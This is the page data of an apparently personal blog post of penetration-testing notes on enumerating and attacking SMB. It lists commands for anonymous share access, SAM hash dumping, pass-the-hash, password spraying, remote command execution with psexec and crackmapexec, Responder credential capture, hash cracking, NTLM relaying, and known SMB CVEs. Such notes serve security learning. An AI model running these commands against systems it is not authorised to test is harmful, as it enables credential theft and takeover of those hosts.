{"componentChunkName":"component---src-templates-post-template-tsx","path":"/230329/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h1>SMB</h1>\n<aside>\r\nðŸ’¡ 2/8 of Basic Network Services\n</aside>\n<h2>1. Information about SMB</h2>\n<ul>\n<li>Normally TCP port 137,138,139 or 445(windows)</li>\n<li>In windows commonly MSRPC</li>\n<li>Typical Misconfiguration : anonymous authentication</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">smbclient -N -L //10.129.14.128 <span class=\"token builtin class-name\">:</span> anonymous</code></pre></div>\n<h2>2. Interaction, Enumeration</h2>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">smbmap -H <span class=\"token number\">10.129</span>.14.128 -r notes <span class=\"token builtin class-name\">:</span> show the folder notes\r\nsmbmap -H <span class=\"token number\">10.129</span>.14.128 --download <span class=\"token string\">\"notes<span class=\"token entity\" title=\"\\n\">\\n</span>ote.txt\"</span> <span class=\"token builtin class-name\">:</span> download something\r\nsmbmap -H <span class=\"token number\">10.129</span>.14.128 --upload test.txt <span class=\"token string\">\"notes<span class=\"token entity\" title=\"\\t\">\\t</span>est.txt\"</span> <span class=\"token builtin class-name\">:</span> upload something</code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">rpcclient -U<span class=\"token string\">'%'</span> <span class=\"token number\">10.10</span>.110.17</code></pre></div>\n<ul>\n<li>\n<p>SMB Interaction Cheat Sheet</p>\n<p><a href=\"https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf\" target=\"_blank\" rel=\"nofollow\"></a></p>\n</li>\n<li>\n<p>Enum4linux</p>\n</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">./enum4linux-ng.py <span class=\"token number\">10.10</span>.11.45 -A -C</code></pre></div>\n<ul>\n<li>Extracting Hashes /PtH</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">crackmapexec smb <span class=\"token number\">10.10</span>.110.17 -u administrator -p <span class=\"token string\">'Password123!'</span> --sam\r\ncrackmapexec smb <span class=\"token number\">10.10</span>.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE</code></pre></div>\n<h2>3. Brute Forcing</h2>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">crackmapexec smb <span class=\"token number\">10.10</span>.110.17 -u /tmp/userlist.txt -p <span class=\"token string\">'Company01!'</span> <span class=\"token builtin class-name\">:</span> password spraying\r\ncrackmapexec smb <span class=\"token number\">10.10</span>.110.0/24 -u administrator -p <span class=\"token string\">'Password123!'</span> --loggedon-users </code></pre></div>\n<h2>4. Remote Code Execution</h2>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">impacket-psexec administrator:<span class=\"token string\">'Password123!'</span>@10.10.110.17\r\ncrackmapexec smb <span class=\"token number\">10.10</span>.110.17 -u Administrator -p <span class=\"token string\">'Password123!'</span> -x <span class=\"token string\">'whoami'</span> --exec-method smbexec</code></pre></div>\n<h2>5. Forced Authentication with Responder</h2>\n<h3>What is Responder?</h3>\n<p>Responder is a powerful open-source tool used for performing network analysis and attacks on Microsoft Windows-based systems.</p>\n<p>Responder works by listening to traffic on the network and responding to various types of network traffic to capture authentication credentials.</p>\n<p>To use Responder, you need to first download and install it on a computer that is connected to the network you wish to analyze.</p>\n<h3>Process</h3>\n<p>used by attackers who have already gained access to a network and are attempting to move laterally to other system</p>\n<ol>\n<li>Install Responder on target System</li>\n</ol>\n<ul>\n<li>The hostname file shareâ€™s IP address is required</li>\n<li>The local host file (C:\\Windows\\System32\\Drivers\\etc\\hosts) will be checked for suitable records.</li>\n<li>If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names</li>\n<li>Is there no local DNS record? A query will be sent to the DNS server that has been configured.</li>\n</ul>\n<ol>\n<li>Execute Responder</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">sudo</span> responder -I ens33</code></pre></div>\n<ol>\n<li>Crack captured Hashes</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">hashcat -m <span class=\"token number\">5600</span> hash.txt /usr/share/wordlists/rockyou.txt</code></pre></div>\n<ol>\n<li>Pass the Hash or NLTM Replay</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">impacket-ntlmrelayx --no-http-server -smb2support -t <span class=\"token number\">10.10</span>.110.146</code></pre></div>\n<h2>6. Common CVE</h2>\n<ul>\n<li>CVE-2017-0143 (SMBv1)</li>\n<li>CVE-2020-0796 (SMBv3)</li>\n<li>CVE-2017-0144 (SMBv1)</li>\n<li>CVE-2018-0802 (connected with MS Word, Exel and Outlook)</li>\n<li>CVE-2019-0708 (BlueKeep)</li>\n<li>Eternal Blue (based on buffer overflow)</li>\n</ul>\n<h2>Source</h2>\n<ul>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"Enumerating & Abusing SMB","summary":"Enumerating & Abusing SMB Service","date":"2023.03.29.","before":"2023.03.27.","after":"2023.04.01.","categories":["C-SEC","ENG","Network"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAAByklEQVQoz2VS227aQBDlD0oTfNud9T9UFXkoIsZeszbBjqGiUaVSRWlLYjABg9dgQyBCea2iPvSDq8WkNKo0Wo1mz9kzZ2dKpDk/hD2D1gJ1t+BwQuN9JSb27Aj4L0r/komTgJdhL8deDu4C9Xa480BY8gpTnFS8WzrKXixR9xHcFF+utd4Odbfq9U909fSXXACIw8HL0dUTuOlRGQdr+ccv9PGRWFNCY50larDS/IwwLgAswd2tcvMsrPV20t1v7K9Kogd7ptO4uD4YZolijk7efXr7/rNiRnpzTqwptJe4syE0BoejzkZ4BjeFiyUOHqCd4c4GWqJt7K9OjEHZGpbdyWn9e1ERgGANrQUONoLMkpKw5HB0uSJuSlxOWIK8HNqZZNyVP3x9U7uWjZC0M+Tnon+HH8HNPVlrDKXqF9UY6oxrjahS7atGCA5XjbBIlPpt5ayPrHvCErV+K1X7yBoLZbBjiUbIzyUaYTqRrRH2MtmKMJvpDtedFNGpYt/j9lKmY2yOpeYEeZnUCA9tq1ZUqd0oZkQYV62xdD5QzJGws/9LYHOlEUrnA40KZaUxPK19U/f5YVRApy8zS6BYr9cB9kvR3oOZ2LA/nDS10ZKT/+IAAAAASUVORK5CYII="},"images":{"fallback":{"src":"/static/0bb5367a7b6591387966cb0dbcd447fc/25388/2.png","srcSet":"/static/0bb5367a7b6591387966cb0dbcd447fc/deefd/2.png 75w,\n/static/0bb5367a7b6591387966cb0dbcd447fc/292ee/2.png 150w,\n/static/0bb5367a7b6591387966cb0dbcd447fc/25388/2.png 300w","sizes":"(min-width: 300px) 300px, 100vw"},"sources":[{"srcSet":"/static/0bb5367a7b6591387966cb0dbcd447fc/0e611/2.webp 75w,\n/static/0bb5367a7b6591387966cb0dbcd447fc/6958a/2.webp 150w,\n/static/0bb5367a7b6591387966cb0dbcd447fc/a2761/2.webp 300w","type":"image/webp","sizes":"(min-width: 300px) 300px, 100vw"}]},"width":300,"height":168}},"publicURL":"/static/0bb5367a7b6591387966cb0dbcd447fc/2.png"}}}}]}},"pageContext":{"slug":"/230329/"}},"staticQueryHashes":[]}